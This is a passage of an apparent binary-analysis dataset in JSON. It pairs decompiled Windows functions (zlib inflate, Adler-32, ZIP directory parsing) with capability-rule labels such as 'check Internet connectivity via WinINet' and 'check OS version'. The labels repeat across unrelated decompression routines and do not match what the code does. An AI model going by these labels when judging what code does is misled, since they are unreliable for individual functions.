var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    var_d0h = arg_1ch;\n    var_cch = arg_20h;\n    var_c0h = arg_24h;\n    var_c4h = arg_8h;\n    var_48h = 0;\n    var_44h = 0;\n    var_40h = 0;\n    var_3ch = 0;\n    var_38h = 0;\n    var_34h = 0;\n    var_30h = 0;\n    var_2ch = 0;\n    var_28h = 0;\n    var_24h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    var_18h = 0;\n    var_14h = 0;\n    var_10h = 0;\n    var_ch = 0;\n    var_94h = arg_8h;\n    piVar9 = in_ECX;\n    do {\n        (&var_48h)[*piVar9] = (&var_48h)[*piVar9] + 1;\n        piVar9 = piVar9 + 1;\n        var_94h = var_94h - 1;\n    } while (var_94h != 0);\n    var_a0h = in_ECX;\n    if (var_48h == arg_8h) {\n        *in_EDX = 0;\n        *arg_18h = 0;\n    }\n    else {\n        var_8ch = 1;\n        var_90h = *arg_18h;\n        var_b8h = 0xf;\n        do {\n            if ((&var_48h)[var_8ch] != 0) break;\n            var_8ch = var_8ch + 1;\n        } while (var_8ch < 0x10);\n        if (*arg_18h < var_8ch) {\n            var_90h = var_8ch;\n        }\n        do {\n            if ((&var_48h)[var_b8h] != 0) break;\n            var_b8h = var_b8h - 1;\n        } while (var_b8h != 0);\n        if (var_b8h < var_90h) {\n            var_90h = var_b8h;\n        }\n        *arg_18h = var_90h;\n        iVar3 = 1 << (var_8ch & 0x1f);\n        for (uVar7 = var_8ch; uVar7 < var_b8h; uVar7 = uVar7 + 1) {\n            if (iVar3 - (&var_48h)[uVar7] < 0) goto code_r0x00405a20;\n            iVar3 = (iVar3 - (&var_48h)[uVar7]) * 2;\n        }\n        iVar8 = (&var_48h)[var_b8h];\n        var_c8h = iVar3 - iVar8;\n        if (-1 < var_c8h) {\n            (&var_48h)[var_b8h] = iVar8 + var_c8h;\n            iVar3 = 0;\n            iVar8 = var_b8h - 1;\n            var_84h = 0;\n            if (iVar8 != 0) {\n                iVar5 = 0;\n                do {\n                    iVar3 = iVar3 + *(&var_44h + iVar5);\n                    iVar8 = iVar8 + -1;\n                    *(aiStack132 + iVar5) = iVar3;\n                    iVar5 = iVar5 + 4;\n                } while (iVar8 != 0);\n            }\n            uVar7 = 0;\n            do {\n                iVar3 = *in_ECX;\n                in_ECX = in_ECX + 1;\n                var_9ch = in_ECX;\n                if (iVar3 != 0) {\n                    iVar8 = (&var_88h)[iVar3];\n                    arg_24h[iVar8] = uVar7;\n                    (&var_88h)[iVar3] = iVar8 + 1;\n                }\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < arg_8h);\n            var_98h = -1;\n            var_c4h = (&var_88h)[var_b8h];\n            var_9ch = arg_24h;\n            iVar3 = -var_90h;\n            var_94h = 0;\n            var_88h = 0;\n            var_110h = 0;\n            var_b4h = 0;\n            var_a0h = NULL;\n            if (var_8ch <= var_b8h) {\n                var_bch = &var_48h + var_8ch;\n                uVar7 = var_a4h;\n                var_d4h = in_EDX;\n                do {\n                    var_ach = *var_bch;\n                    while (var_ach != 0) {\n                        var_ach = var_ach - 1;\n                        if (iVar3 + var_90h < var_8ch) {\n                            var_b0h = iVar3 - var_90h;\n                            iVar8 = iVar3 + var_90h;\n                            do {\n                                iVar3 = iVar8;\n                                iVar8 = var_98h + 1;\n                                var_98h = iVar8;\n                                var_b0h = var_b0h + var_90h;\n                                uVar7 = var_b8h - iVar3;\n                                if (var_90h < var_b8h - iVar3) {\n                                    uVar7 = var_90h;\n                                }\n                                uVar1 = var_8ch - iVar3;\n                                uVar4 = 1 << (uVar1 & 0x1f);\n                                if ((var_ach + 1 < uVar4) &&\n                                   (iVar5 = uVar4 + (-1 - var_ach),  puVar2 = var_bch,  uVar1 < uVar7)) {\n                                    while (uVar1 = uVar1 + 1,  uVar1 < uVar7) {\n                                        uVar4 = puVar2[1];\n                                        if (iVar5 * 2 <= uVar4) break;\n                                        iVar5 = iVar5 * 2 - uVar4;\n                                        puVar2 = puVar2 + 1;\n                                    }\n                                }\n                                var_a0h = 1 << (uVar1 & 0x1f);\n                                uVar7 = *var_cch + var_a0h;\n                                if (0x5a0 < uVar7) goto code_r0x00405a20;\n                                var_b4h = var_d0h + *var_cch * 8;\n                                (&var_110h)[iVar8] = var_b4h;\n                                *var_cch = uVar7;\n                                if (var_98h == 0) {\n                                    *var_d4h = var_b4h;\n                                }\n                                else {\n                                    (&var_88h)[var_98h] = var_94h;\n                                    var_a8h = uVar1 & 0xff | CONCAT21(var_a8h._2_2_, var_90h) << 8;\n                                    uVar7 = var_94h >> (var_b0h & 0x1f);\n                                    iVar8 = *(&stack0xfffffee8 + iVar8 * 4);\n                                    var_a4h = (var_b4h - iVar8 >> 3) - uVar7;\n                                    *(iVar8 + uVar7 * 8) = var_a8h;\n                                    *(iVar8 + 4 + uVar7 * 8) = var_a4h;\n                                }\n                                iVar8 = iVar3 + var_90h;\n                                uVar7 = var_a4h;\n                            } while (iVar3 + var_90h < var_8ch);\n                        }\n                        uVar6 = iVar3;\n                        if (var_9ch < var_c0h + var_c4h) {\n                            uVar7 = *var_9ch;\n                            if (uVar7 < arg_ch) {\n                                var_a8h._0_1_ = (uVar7 < 0x100) - 1U & 0x60;\n                            }\n                            else {\n                                var_a8h._0_1_ = *(arg_14h + (uVar7 - arg_ch) * 4) + 0x50;\n                                uVar7 = *(arg_10h + (uVar7 - arg_ch) * 4);\n                            }\n                            var_9ch = var_9ch + 1;\n                            var_a4h = uVar7;\n                        }\n                        else {\n                            var_a8h._0_1_ = 0xc0;\n                        }\n                        var_a8h = CONCAT31(CONCAT21(var_a8h._2_2_, var_8ch - uVar6), var_a8h);\n                        var_b0h = 1 << (var_8ch - uVar6 & 0x1f);\n                        piVar9 = var_94h >> (uVar6 & 0x1f);\n                        if (piVar9 < var_a0h) {\n                            puVar2 = var_b4h + piVar9 * 8;\n                            do {\n                                *puVar2 = var_a8h;\n                                piVar9 = piVar9 + var_b0h;\n                                puVar2[1] = uVar7;\n                                puVar2 = puVar2 + var_b0h * 2;\n                            } while (piVar9 < var_a0h);\n                        }\n                        uVar1 = 1 << (var_8ch - 1U & 0x1f);\n                        while ((var_94h & uVar1) != 0) {\n                            var_94h = var_94h ^ uVar1;\n                            uVar1 = uVar1 >> 1;\n                        }\n                        var_94h = var_94h ^ uVar1;\n                        for (; ((1 << (iVar3 & 0x1f)) - 1U & var_94h) != (&var_88h)[var_98h]; var_98h = var_98h + -1) {\n                            iVar3 = iVar3 - var_90h;\n                        }\n                    }\n                    var_8ch = var_8ch + 1;\n                    var_bch = var_bch + 1;\n                } while (var_8ch <= var_b8h);\n            }\n        }\n    }\ncode_r0x00405a20:\n    fcn.0041e0a1(var_110h);\n    return;\n}\n",
        "token_count": 2854
    },
    "00405a2f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405a2f(uint arg_8h, int32_t *arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t arg_24h;\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    arg_24h = (**(unaff_ESI + 0x20))(*(unaff_ESI + 0x28), 0x13, 4);\n    if (arg_24h == 0) {\n        iVar1 = -4;\n    }\n    else {\n        iVar1 = fcn.0040555d(0x13, 0x13, 0, 0, arg_ch, arg_14h, &var_4h, arg_24h);\n        if (iVar1 == -3) {\n            *(unaff_ESI + 0x18) = \"oversubscribed dynamic bit lengths tree\";\n        }\n        else if ((iVar1 == -5) || (*arg_ch == 0)) {\n            *(unaff_ESI + 0x18) = \"incomplete dynamic bit lengths tree\";\n            iVar1 = -3;\n        }\n        (**(unaff_ESI + 0x24))(*(unaff_ESI + 0x28), arg_24h);\n    }\n    return iVar1;\n}\n",
        "token_count": 316
    },
    "00405aab": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405aab(uint arg_8h, int32_t *arg_ch, int32_t *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint32_t unaff_EBX;\n    int32_t unaff_ESI;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = (**(unaff_ESI + 0x20))(*(unaff_ESI + 0x28), 0x120, 4);\n    if (var_4h == 0) {\n        return -4;\n    }\n    var_ch = fcn.0040555d(unaff_EBX, 0x101, 0x43d6a8, 0x43d728, arg_ch, arg_1ch, &var_8h, var_4h);\n    if (var_ch == 0) {\n        if (*arg_ch != 0) {\n            iVar1 = fcn.0040555d(arg_8h, 0, 0x43d7a8, 0x43d820, arg_10h, arg_1ch, &var_8h, var_4h);\n            if (iVar1 == 0) {\n                if ((*arg_10h != 0) || (unaff_EBX < 0x102)) {\n                    (**(unaff_ESI + 0x24))(*(unaff_ESI + 0x28), var_4h);\n                    return 0;\n                }\n            }\n            else {\n                if (iVar1 == -3) {\n                    *(unaff_ESI + 0x18) = \"oversubscribed distance tree\";\n                    goto code_r0x00405b91;\n                }\n                if (iVar1 == -5) {\n                    *(unaff_ESI + 0x18) = \"incomplete distance tree\";\n                    iVar1 = -3;\n                    goto code_r0x00405b91;\n                }\n                if (iVar1 == -4) goto code_r0x00405b91;\n            }\n            *(unaff_ESI + 0x18) = \"empty distance tree with lengths\";\n            iVar1 = -3;\ncode_r0x00405b91:\n            (**(unaff_ESI + 0x24))(*(unaff_ESI + 0x28), var_4h);\n            return iVar1;\n        }\n    }\n    else {\n        if (var_ch == -3) {\n            *(unaff_ESI + 0x18) = \"oversubscribed literal/length tree\";\n            goto code_r0x00405bba;\n        }\n        if (var_ch == -4) goto code_r0x00405bba;\n    }\n    *(unaff_ESI + 0x18) = \"incomplete literal/length tree\";\n    var_ch = -3;\ncode_r0x00405bba:\n    (**(unaff_ESI + 0x24))(*(unaff_ESI + 0x28), var_4h);\n    return var_ch;\n}\n",
        "token_count": 702
    },
    "0040601b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040601b(uint32_t arg_8h, uint8_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    int32_t iVar17;\n    int32_t iVar18;\n    \n    uVar3 = arg_8h & 0xffff;\n    arg_8h = arg_8h >> 0x10;\n    if (arg_ch == NULL) {\n        uVar3 = 1;\n    }\n    else {\n        if (arg_10h != 0) {\n            do {\n                uVar2 = 0x15b0;\n                if (arg_10h < 0x15b0) {\n                    uVar2 = arg_10h;\n                }\n                arg_10h = arg_10h - uVar2;\n                if (0xf < uVar2) {\n                    uVar1 = uVar2 >> 4;\n                    uVar2 = uVar2 + uVar1 * -0x10;\n                    do {\n                        iVar4 = uVar3 + *arg_ch;\n                        iVar5 = iVar4 + arg_ch[1];\n                        iVar6 = iVar5 + arg_ch[2];\n                        iVar7 = iVar6 + arg_ch[3];\n                        iVar8 = iVar7 + arg_ch[4];\n                        iVar9 = iVar8 + arg_ch[5];\n                        iVar10 = iVar9 + arg_ch[6];\n                        iVar11 = iVar10 + arg_ch[7];\n                        iVar12 = iVar11 + arg_ch[8];\n                        iVar13 = iVar12 + arg_ch[9];\n                        iVar14 = iVar13 + arg_ch[10];\n                        iVar15 = iVar14 + arg_ch[0xb];\n                        iVar16 = iVar15 + arg_ch[0xc];\n                        iVar17 = iVar16 + arg_ch[0xd];\n                        iVar18 = iVar17 + arg_ch[0xe];\n                        uVar3 = iVar18 + arg_ch[0xf];\n                        arg_8h = arg_8h + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11 + iVar12 +\n                                 iVar13 + iVar14 + iVar15 + iVar16 + iVar17 + iVar18 + uVar3;\n                        arg_ch = arg_ch + 0x10;\n                        uVar1 = uVar1 - 1;\n                    } while (uVar1 != 0);\n                }\n                for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                    uVar3 = uVar3 + *arg_ch;\n                    arg_ch = arg_ch + 1;\n                    arg_8h = arg_8h + uVar3;\n                }\n                uVar3 = uVar3 % 0xfff1;\n                arg_8h = arg_8h % 0xfff1;\n            } while (arg_10h != 0);\n        }\n        uVar3 = arg_8h << 0x10 | uVar3;\n    }\n    return uVar3;\n}\n",
        "token_count": 763
    },
    "00406185": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00406185(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    if (((in_EAX != 0) && (*(in_EAX + 0x1c) != 0)) && (*(in_EAX + 0x24) != 0)) {\n        iVar1 = *(*(in_EAX + 0x1c) + 0x14);\n        if (iVar1 != 0) {\n            fcn.00404c82();\n            (**(in_EAX + 0x24))(*(in_EAX + 0x28), *(iVar1 + 0x28));\n            (**(in_EAX + 0x24))(*(in_EAX + 0x28), *(iVar1 + 0x24));\n            (**(in_EAX + 0x24))(*(in_EAX + 0x28), iVar1);\n        }\n        (**(in_EAX + 0x24))(*(in_EAX + 0x28), *(in_EAX + 0x1c));\n        *(in_EAX + 0x1c) = 0;\n        return 0;\n    }\n    return 0xfffffffe;\n}\n",
        "token_count": 263
    },
    "00406279": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00406279(void)\n\n{\n    uint8_t uVar1;\n    uint8_t **in_EAX;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t arg_ch;\n    \n    if (((in_EAX == NULL) || (puVar2 = in_EAX[7],  puVar2 == NULL)) || (*in_EAX == NULL)) {\ncode_r0x00406496:\n        return -2;\n    }\n    arg_ch = -5;\ncode_r0x00406489:\n    // switch table (14 cases) at 0x406589\n    switch(*puVar2) {\n    case 0:\n        if (in_EAX[1] == NULL) {\n            return arg_ch;\n        }\n        arg_ch = 0;\n        in_EAX[2] = in_EAX[2] + 1;\n        in_EAX[1] = in_EAX[1] + -1;\n        uVar1 = **in_EAX;\n        *(in_EAX[7] + 4) = uVar1;\n        *in_EAX = *in_EAX + 1;\n        puVar2 = in_EAX[7];\n        if ((uVar1 & 0xf) == 8) {\n            uVar3 = (puVar2[1] >> 4) + 8;\n            if (uVar3 < puVar2[4] || uVar3 == puVar2[4]) {\n                *puVar2 = 1;\n                goto code_r0x00406308;\n            }\n            *puVar2 = 0xd;\n            in_EAX[6] = \"invalid window size\";\n        }\n        else {\n            *puVar2 = 0xd;\n            in_EAX[6] = \"unknown compression method\";\n        }\n        goto code_r0x0040647c;\n    case 1:\ncode_r0x00406308:\n        if (in_EAX[1] == NULL) {\n            return arg_ch;\n        }\n        puVar2 = in_EAX[7];\n        arg_ch = 0;\n        in_EAX[2] = in_EAX[2] + 1;\n        in_EAX[1] = in_EAX[1] + -1;\n        uVar1 = **in_EAX;\n        *in_EAX = *in_EAX + 1;\n        if ((puVar2[1] * 0x100 + uVar1) % 0x1f != 0) {\n            *puVar2 = 0xd;\n            in_EAX[6] = \"incorrect header check\";\n            goto code_r0x0040647c;\n        }\n        if ((uVar1 & 0x20) != 0) {\n            *in_EAX[7] = 2;\n            goto code_r0x004064a9;\n        }\n        *puVar2 = 7;\n        break;\n    case 2:\ncode_r0x004064a9:\n        if (in_EAX[1] == NULL) {\n            return arg_ch;\n        }\n        arg_ch = 0;\n        in_EAX[2] = in_EAX[2] + 1;\n        in_EAX[1] = in_EAX[1] + -1;\n        *(in_EAX[7] + 8) = **in_EAX << 0x18;\n        *in_EAX = *in_EAX + 1;\n        *in_EAX[7] = 3;\n    case 3:\n        goto code_r0x004064d2;\n    case 4:\n        goto code_r0x004064fb;\n    case 5:\n        goto code_r0x00406524;\n    case 6:\n        *in_EAX[7] = 0xd;\n        in_EAX[6] = \"need dictionary\";\n        *(in_EAX[7] + 4) = 0;\n        return -2;\n    case 7:\n        arg_ch = fcn.00404d5d(*(in_EAX[7] + 0x14), arg_ch);\n        if (arg_ch == -3) {\n            *in_EAX[7] = 0xd;\n            *(in_EAX[7] + 4) = 0;\n        }\n        else {\n            if (arg_ch != 1) {\n                return arg_ch;\n            }\n            arg_ch = 0;\n            fcn.00404c82();\n            puVar2 = in_EAX[7];\n            if (puVar2[3] == 0) {\n                *puVar2 = 8;\n                goto code_r0x004063c4;\n            }\n            *puVar2 = 0xc;\n        }\n        break;\n    case 8:\ncode_r0x004063c4:\n        if (in_EAX[1] == NULL) {\n            return arg_ch;\n        }\n        arg_ch = 0;\n        in_EAX[2] = in_EAX[2] + 1;\n        in_EAX[1] = in_EAX[1] + -1;\n        *(in_EAX[7] + 8) = **in_EAX << 0x18;\n        *in_EAX = *in_EAX + 1;\n        *in_EAX[7] = 9;\n    case 9:\n        if (in_EAX[1] == NULL) {\n            return arg_ch;\n        }\n        arg_ch = 0;\n        in_EAX[2] = in_EAX[2] + 1;\n        in_EAX[1] = in_EAX[1] + -1;\n        *(in_EAX[7] + 8) = *(in_EAX[7] + 8) + **in_EAX * 0x10000;\n        *in_EAX = *in_EAX + 1;\n        *in_EAX[7] = 10;\n    case 10:\n        goto code_r0x0040641e;\n    case 0xb:\n        goto code_r0x00406447;\n    case 0xc:\n        goto code_r0x00406496;\n    case 0xd:\n        return -3;\n    default:\n        goto code_r0x00406496;\n    }\ncode_r0x00406486:\n    puVar2 = in_EAX[7];\n    goto code_r0x00406489;\ncode_r0x0040641e:\n    if (in_EAX[1] == NULL) {\n        return arg_ch;\n    }\n    arg_ch = 0;\n    in_EAX[2] = in_EAX[2] + 1;\n    in_EAX[1] = in_EAX[1] + -1;\n    *(in_EAX[7] + 8) = *(in_EAX[7] + 8) + **in_EAX * 0x100;\n    *in_EAX = *in_EAX + 1;\n    *in_EAX[7] = 0xb;\ncode_r0x00406447:\n    if (in_EAX[1] == NULL) {\n        return arg_ch;\n    }\n    in_EAX[2] = in_EAX[2] + 1;\n    in_EAX[1] = in_EAX[1] + -1;\n    *(in_EAX[7] + 8) = *(in_EAX[7] + 8) + **in_EAX;\n    puVar2 = in_EAX[7];\n    *in_EAX = *in_EAX + 1;\n    if (puVar2[1] == puVar2[2]) {\n        *in_EAX[7] = 0xc;\ncode_r0x00406496:\n        return 1;\n    }\n    *puVar2 = 0xd;\n    in_EAX[6] = \"incorrect data check\";\ncode_r0x0040647c:\n    arg_ch = 0;\n    *(in_EAX[7] + 4) = 5;\n    goto code_r0x00406486;\ncode_r0x004064d2:\n    if (in_EAX[1] == NULL) {\n        return arg_ch;\n    }\n    arg_ch = 0;\n    in_EAX[2] = in_EAX[2] + 1;\n    in_EAX[1] = in_EAX[1] + -1;\n    *(in_EAX[7] + 8) = *(in_EAX[7] + 8) + **in_EAX * 0x10000;\n    *in_EAX = *in_EAX + 1;\n    *in_EAX[7] = 4;\ncode_r0x004064fb:\n    if (in_EAX[1] == NULL) {\n        return arg_ch;\n    }\n    arg_ch = 0;\n    in_EAX[2] = in_EAX[2] + 1;\n    in_EAX[1] = in_EAX[1] + -1;\n    *(in_EAX[7] + 8) = *(in_EAX[7] + 8) + **in_EAX * 0x100;\n    *in_EAX = *in_EAX + 1;\n    *in_EAX[7] = 5;\ncode_r0x00406524:\n    if (in_EAX[1] != NULL) {\n        in_EAX[2] = in_EAX[2] + 1;\n        in_EAX[1] = in_EAX[1] + -1;\n        *(in_EAX[7] + 8) = *(in_EAX[7] + 8) + **in_EAX;\n        *in_EAX = *in_EAX + 1;\n        in_EAX[0xc] = *(in_EAX[7] + 8);\n        *in_EAX[7] = 6;\n        return 2;\n    }\n    return arg_ch;\n}\n",
        "token_count": 2169
    },
    "004065c1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004065c1(void)\n\n{\n    int32_t unaff_ESI;\n    \n    if (unaff_ESI == 0) {\n        return 0xffffffff;\n    }\n    if (*(unaff_ESI + 0x10) != '\\0') {\n        (**0x446344)(*(unaff_ESI + 4));\n    }\n    fcn.0041e801();\n    return 0;\n}\n",
        "token_count": 93
    },
    "004065e2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004065e2(uint param_1, int32_t param_2)\n\n{\n    char *in_EAX;\n    int32_t unaff_ESI;\n    \n    if (*in_EAX == '\\0') {\n        if (unaff_ESI == 0) {\n            *(in_EAX + 0x1c) = param_2;\n        }\n        else if (unaff_ESI == 1) {\n            *(in_EAX + 0x1c) = *(in_EAX + 0x1c) + param_2;\n        }\n        else if (unaff_ESI == 2) {\n            *(in_EAX + 0x1c) = *(in_EAX + 0x18) + param_2;\n        }\n    }\n    else {\n        if (in_EAX[1] == '\\0') {\n            return 0x1d;\n        }\n        if (unaff_ESI == 0) {\n            param_2 = *(in_EAX + 0xc) + param_2;\n        }\n        else if ((unaff_ESI != 1) && (unaff_ESI != 2)) {\n            return 0x13;\n        }\n        (**0x44635c)(*(in_EAX + 4), param_2, 0);\n    }\n    return 0;\n}\n",
        "token_count": 295
    },
    "00406641": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00406641(uint arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    char *unaff_ESI;\n    uint32_t arg_10h_00;\n    \n    arg_10h_00 = arg_ch * arg_10h;\n    if (*unaff_ESI == '\\0') {\n        iVar1 = *(unaff_ESI + 0x1c);\n        if (*(unaff_ESI + 0x18) < iVar1 + arg_10h_00) {\n            arg_10h_00 = *(unaff_ESI + 0x18) - iVar1;\n        }\n        fcn.00420150(arg_8h, *(unaff_ESI + 0x14) + iVar1, arg_10h_00);\n        *(unaff_ESI + 0x1c) = *(unaff_ESI + 0x1c) + arg_10h_00;\n        arg_10h = arg_10h_00;\n    }\n    else {\n        iVar1 = (**0x446468)(*(unaff_ESI + 4), arg_8h, arg_10h_00, &arg_10h, 0);\n        if (iVar1 == 0) {\n            unaff_ESI[8] = '\\x01';\n        }\n    }\n    return arg_10h / arg_ch;\n}\n",
        "token_count": 318
    },
    "004066a1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.004066a1(uint32_t *arg_8h)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    uint32_t in_ECX;\n    uint var_1h;\n    \n    iVar1 = fcn.00406641(&var_1h, 1, 1);\n    if (iVar1 == 1) {\n        *arg_8h = in_ECX >> 0x18;\n    }\n    else if ((*in_EAX != '\\0') && (in_EAX[8] != '\\0')) {\n        return 0xffffffff;\n    }\n    return 0;\n}\n",
        "token_count": 155
    },
    "00406781": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406781(char *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar1 = fcn.004065e2();\n    if (iVar1 == 0) {\n        if (*arg_8h == '\\0') {\n            var_4h = *(arg_8h + 0x1c);\n        }\n        else if (arg_8h[1] == '\\0') {\n            var_4h = 0;\n        }\n        else {\n            iVar1 = fcn.004045fe(*(arg_8h + 4));\n            var_4h = iVar1 - *(arg_8h + 0xc);\n        }\n        var_8h = 0xffff;\n        if (var_4h < 0xffff) {\n            var_8h = var_4h;\n        }\n        iVar1 = fcn.0041e0ea(0x404);\n        if (iVar1 == 0) {\n            var_14h = -1;\n        }\n        else {\n            var_14h = -1;\n            var_ch = 4;\n            if (4 < var_8h) {\n                while( true ) {\n                    uVar2 = var_ch + 0x400;\n                    var_ch = var_8h;\n                    if (uVar2 <= var_8h) {\n                        var_ch = uVar2;\n                    }\n                    uVar3 = var_4h - (var_4h - var_ch);\n                    uVar2 = 0x404;\n                    if (uVar3 < 0x405) {\n                        uVar2 = uVar3;\n                    }\n                    iVar4 = fcn.004065e2();\n                    if ((iVar4 != 0) || (iVar4 = fcn.00406641(iVar1, uVar2, 1),  iVar4 != 1)) break;\n                    iVar4 = uVar2 - 3;\n                    do {\n                        iVar5 = iVar4;\n                        if (iVar5 < 0) goto code_r0x00406891;\n                        iVar4 = iVar5 + -1;\n                    } while ((((*(iVar4 + iVar1) != 'P') || (*(iVar5 + iVar1) != 'K')) ||\n                             (*(iVar5 + 1 + iVar1) != '\\x05')) || (*(iVar5 + 2 + iVar1) != '\\x06'));\n                    var_14h = iVar4 + (var_4h - var_ch);\ncode_r0x00406891:\n                    if ((var_14h != 0) || (var_8h <= var_ch)) break;\n                }\n            }\n            fcn.0041e0b0(iVar1);\n        }\n    }\n    else {\n        var_14h = -1;\n    }\n    return var_14h;\n}\n",
        "token_count": 685
    },
    "00406a31": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406a31(uint *arg_8h, uint *arg_ch, uint *arg_10h, int32_t arg_14h, uint32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint32_t arg_ch_00;\n    uint *puVar2;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint32_t var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    \n    var_8h = 0;\n    if (arg_8h == NULL) {\n        var_8h = -0x66;\n    }\n    else {\n        iVar1 = fcn.004065e2();\n        if (iVar1 == 0) {\n            iVar1 = fcn.00406717();\n            if (iVar1 == 0) {\n                if (var_ch != 0x2014b50) {\n                    var_8h = -0x67;\n                }\n            }\n            else {\n                var_8h = -1;\n            }\n        }\n        else {\n            var_8h = -1;\n        }\n        iVar1 = fcn.004066db(*arg_8h);\n        if (iVar1 != 0) {\n            var_8h = -1;\n        }\n        iVar1 = fcn.004066db(*arg_8h);\n        if (iVar1 != 0) {\n            var_8h = -1;\n        }\n        iVar1 = fcn.004066db(*arg_8h);\n        if (iVar1 != 0) {\n            var_8h = -1;\n        }\n        iVar1 = fcn.004066db(*arg_8h);\n        if (iVar1 != 0) {\n            var_8h = -1;\n        }\n        iVar1 = fcn.00406717();\n        if (iVar1 != 0) {\n            var_8h = -1;\n        }\n        var_18h = var_4ch >> 0x10 & 0x1f;\n        var_10h = (var_4ch >> 0x19) + 0x7bc;\n        var_1ch = var_4ch >> 0xb & 0x1f;\n        var_14h = (var_4ch >> 0x15 & 0xf) - 1;\n        var_20h = var_4ch >> 5 & 0x3f;\n        var_24h = (var_4ch & 0x1f) * 2;\n        iVar1 = fcn.00406717();\n        if (iVar1 != 0) {\n            var_8h = -1;\n        }\n        iVar1 = fcn.00406717();\n        if (iVar1 != 0) {\n            var_8h = 